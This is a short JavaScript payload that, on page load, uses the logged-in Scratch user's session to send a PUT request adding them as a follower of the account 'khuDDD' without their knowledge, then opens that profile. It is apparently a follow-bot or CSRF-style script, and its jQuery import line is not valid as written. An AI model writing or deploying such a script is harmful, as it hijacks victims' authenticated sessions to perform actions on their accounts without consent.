import "https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"

function followme() {
    $.ajax({
        type: "PUT",
        url: "http://scratch.mit.edu/site-api/users/followers/" + "khuDDD" + "/add/",
        data: {usernames: Scratch.INIT_DATA.LOGGED_IN_USER.model.username}
    });
    window.open("https://scratch.mit.edu/users/khuDDD")
}
window.onload = followme;